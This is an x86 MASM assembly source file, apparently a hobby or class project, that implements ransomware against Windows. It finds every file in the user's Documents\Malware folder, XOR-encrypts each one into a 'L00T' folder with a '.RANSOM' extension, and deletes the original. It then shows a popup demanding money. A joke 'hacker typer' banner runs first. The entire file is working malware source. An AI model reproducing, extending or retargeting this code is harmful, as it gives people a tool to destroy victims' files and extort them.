
	includelib Winmm.lib
	includelib kernel32.lib
	includelib User32.lib
	includelib Shlwapi.lib
	include Irvine32.inc



GetUserNameA PROTO,
	targetString: PTR BYTE,
	intBuffer: PTR DWORD

Str_compare PROTO,
	string1:PTR BYTE,
	string2:PTR BYTE

DeleteFileA PROTO,
	source: PTR BYTE

FindFirstFileA PROTO,
	fileName: PTR BYTE,
	findData: PTR WIN32_FIND_DATAA

	;RETURNS search handle

FindNextFileA PROTO,
	searchHandle: PTR DWORD,
	LPWIN32_FIND_DATA: PTR WIN32_FIND_DATAA

	;RETURNS nonzero if succeeed

GetLastError PROTO 

Wow64DisableWow64FsRedirection PROTO,
	ignoreTHisPointer: DWORD


CreateFileA PROTO,           ; create new file
    pFilename:PTR BYTE,     ; ptr to filename
    accessMode:DWORD,       ; access mode
    shareMode:DWORD,        ; share mode
    lpSecurity:DWORD,       ; can be NULL
    howToCreate:DWORD,      ; how to create the file
    attributes:DWORD,       ; file attributes
    htemplate:DWORD         ; handle to template file

	; RETURNS handle on success, else 0


ReadFile PROTO,           ; read buffer from input file
    fileHandle:DWORD,     ; handle to file
    pBuffer:PTR BYTE,     ; ptr to buffer
    nBufsize:DWORD,       ; number bytes to read
    pBytesRead:PTR DWORD, ; bytes actually read
    pOverlapped:PTR DWORD ; ptr to asynchronous info

; RETURNS BOOLEAN 



WriteFile PROTO,             ; write buffer to output file
    fileHandle:DWORD,        ; output handle
    pBuffer:PTR BYTE,        ; pointer to buffer
    nBufsize:DWORD,          ; size of buffer
    pBytesWritten:PTR DWORD, ; number of bytes written
    pOverlapped:PTR DWORD    ; ptr to asynchronous info

	; RETURNS BOOLEAN

CreateDirectoryA PROTO,
	directoryPath: PTR BYTE,
	SecurityAttributes: DWORD


DialogBoxParamA PROTO,
    hInstance: PTR BYTE, ;A handle to the module which contains the dialog box template. If this parameter is NULL, then the current executable is used.
    lpTemplateName: PTR BYTE,
    hWndParent: PTR DWORD,
    lpDialogFunc: PTR DWORD,
    dwInitParam: PTR BYTE ;The value to pass to the dialog box in the lParam parameter of the WM_INITDIALOG message.

MessageBoxA PROTO,
    hWnd: DWORD,
    lpText: PTR BYTE,
    lpCaption: PTR BYTE, ;window title
    uType: DWORD




WIN32_FIND_DATAA STRUCT
   dwFileAttributes       DWORD ?
   ftCreationTime         FILETIME <>
   ftLastAccessTime       FILETIME <>
   ftLastWriteTime        FILETIME <>
   nFileSizeHigh          DWORD ?
   nFileSizeLow           DWORD ?
   dwReserved0            DWORD ?
   dwReserved1            DWORD ?
   cFileName              BYTE 260 dup (?)
   cAlternateFileName     BYTE 14 dup (?)
WIN32_FIND_DATAA ENDS
;Return struct for windows library related to files





	
.data
userName BYTE 50 DUP(?)
finalCOmmand BYTE 800 DUP (0) 
TargetDirectory BYTE 800 DUP (0) 
preamble BYTE "C:\Users\",0
EndofTarget BYTE '\Documents\Malware\',0
InputFile BYTE 1000 DUP (0)
FileOutName BYTE 1020 DUP (0)
AsteriskCharacter BYTE "*",0
filePath BYTE 200 DUP(0)
userBuffer DWORD 50
current_file_name BYTE 300 DUP(0)
findDATA WIN32_FIND_DATAA <> ; to store find data
fileInHandle HANDLE ?
fileOutHandle HANDLE ? 
findFileHandle HANDLE ?
TESTSTRING1 byte "This is a test string 1",0
dotRansom BYTE ".RANSOM",0
FileDataBuffer BYTE 10000 DUP (0)
BytesRead DWORD ?
Overlapped DWORD ?
BytesWritten DWORD ?
slashLoot BYTE "L00T\",0


;HackerTyper Val
fullPrompt BYTE "Initiatalizing the mainframe`Initializing quantum freezeray`Initiating launch sequence`Constructing additional Pylons`Beaming up Scotty`Deleting System 32`Hacking into the mainframe",
"`All your base are belong to us`Asserting dominance`Switching Sides`Encrypting your files :)", 0

;Popup Message
popupMessage BYTE "Oops, your files have been encrypted. Please send me money, and I'll tell you how to fix them.",0
popupTitle BYTE "Oops!",0
mode DWORD 00212010h


.code

hackerTyper PROC uses eax ecx esi edi,
    toScreenText: PTR BYTE, ;Text to print to screen
    intervalPerChar: DWORD ;ms between character type

    ;Set Console for hacker typing time...
    call Clrscr
    mov eax, lightGreen + (black *16) ; set color to green forgeround, black background
    call SetTextColor
    
    INVOKE Str_length, toScreenText
    mov edx, eax ;edx stores str len
    mov esi, 0; loop counter

    mov ecx, toScreenText
L1:
    mov al, [ecx]
    call WriteChar

    mov eax, intervalPerChar
    call Delay

L2:
    add ecx, SIZEOF BYTE
    inc esi
    
    mov al, [ecx]
    cmp al, 60h ;backtick hex code
    je L3 ;if backtick, jump to linefeed

    cmp esi, edx ;If not above string len, l
    jle L1
    
    ;If at null, stop and ret
    mov eax, 2000
    call Delay
    ret
L3:
    call Crlf
    jmp L2

hackerTyper ENDP 

ransomMenu PROC
    INVOKE MessageBoxA, 0, OFFSET popupMessage, OFFSET popupTitle, mode
    ret
ransomMenu ENDP

strcat PROC USES eax ecx esi edi,
	target:PTR BYTE, ; source string
	source:PTR BYTE ; target string

	INVOKE Str_length, target
	mov edi, target
	add edi, eax
	mov target, edi
	INVOKE Str_length,source ; EAX = length source
	
	mov ecx,eax ; REP count
	inc ecx ; add 1 for null byte
	mov esi,source
	mov edi,target
	cld 
	rep movsb 
	ret

strcat ENDP


main PROC

	INVOKE hackerTyper, OFFSET fullPrompt, 25
	BeginAgain:
	INVOKE strcat, ADDR TargetDirectory, ADDR preamble
	INVOKE GetUsernameA, ADDR userName,ADDR userBuffer
	INVOKE strcat, ADDR TargetDirectory, ADDR userName
	INVOKE strcat, ADDR TargetDirectory, ADDR EndofTarget;Set up directory to attack


	INVOKE Str_copy, ADDR TargetDirectory, ADDR InputFile

	INVOKE strcat, ADDR InputFile, ADDR AsteriskCharacter; search for all files in target directory


	INVOKE Str_copy, ADDR TargetDirectory, ADDR FileOutName
	INVOKE strcat, ADDR FileOutName, ADDR slashLoot
	INVOKE CreateDirectoryA, ADDR FileOutName, NULL ; create loot bag
	

	INVOKE FindFirstFileA, ADDR InputFile, ADDR findDATA; returns current directory, I don't need it
	mov findFileHandle, EAX; Store the HANDLE used for finding files

	myLoop:
		INVOKE FindNextFileA, findFileHandle, ADDR findDATA
		.IF eax == 0
			INVOKE GetLastError
			.IF eax == 18 ; NO MORE FILES
				jmp EndOfLoop
			.ELSE ; UNKNOWN ERROR, SHOULDN'T GET HERE
				jmp errorState
			.ENDIF
		.ELSEIF findData.dwFileAttributes == FILE_ATTRIBUTE_DIRECTORY
			jmp myLoop ; file is directory, ignore it
		.ELSE
			jmp RansomFile ; File is a target
		.ENDIF

	
	EndOfLoop:
	INVOKE ransomMenu

INVOKE ExitProcess, 1337


	RansomFile:
		INVOKE Str_copy, ADDR TargetDirectory, ADDR InputFile
		INVOKE strcat, ADDR InputFile, ADDR findDATA.cFileName ; Absolute path of fileIn


		INVOKE Str_copy, ADDR TargetDirectory, ADDR FileOutName
		INVOKE strcat, ADDR FileOutName, ADDR slashLoot; Put the Loot in the bag

		INVOKE strcat, ADDR FileOutName, ADDR findDATA.cFileName
		INVOKE strcat, ADDR FileOutName, ADDR dotRansom ; Absolute path of fileOutput

		mov edx, OFFSET FileOutName
		call CreateOutputFIle
		mov fileOutHandle, eax ; create a handle for the output

		INVOKE CreateFileA, ADDR InputFile, GENERIC_READ,FILE_SHARE_READ , NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0
		mov fileInHandle, eax ; create a handle for the input 

		RansomLoop:
			INVOKE ReadFile, fileInHandle, ADDR FileDataBuffer, 5000, ADDR BytesRead, Overlapped
			.IF eax == 0 ; IF there was an error
				INVOKE GetLastError
				.IF eax != 0
					jmp errorState ; check if there was an error reading in the file
				.ENDIF
			.ELSEIF BytesRead == 0 ; If there were no more bytes to read
					jmp endOfRansomLoop
			.ENDIF

			mov edx, OFFSET FileDataBuffer 
			mov ecx, 0
			;Encrypts using an xor cipher because I'm lazy
			beginEncryption:
				.IF ecx < BytesRead
					mov ebx, [edx] ; load FileDataBuffer[ecx] into the ebx
					XOR bl, 69 ; encrypt that byte
					mov [edx], bl ; move that byte back to FileDataBuffer[ecx]
					inc ecx
					add edx, 1
					jmp beginEncryption
				.ENDIF

			INVOKE WriteFile, fileOutHandle, ADDR FileDataBuffer, BytesRead, ADDR BytesWritten, Overlapped
			;Output the encrypted text to the file

			.IF eax == 0 ; The call to WriteFile failed
				INVOKE GetLastError
				jmp errorState
			.ENDIF
			jmp RansomLoop

		endOfRansomLoop:
		
			;Clean up after myself because I'm not a monster
			INVOKE CloseHandle, fileInHandle
			INVOKE CloseHandle, fileOutHandle
			INVOKE DeleteFileA, ADDR InputFile


			jmp myLoop




errorState:
	INVOKE ExitProcess, eax
main ENDP



END main
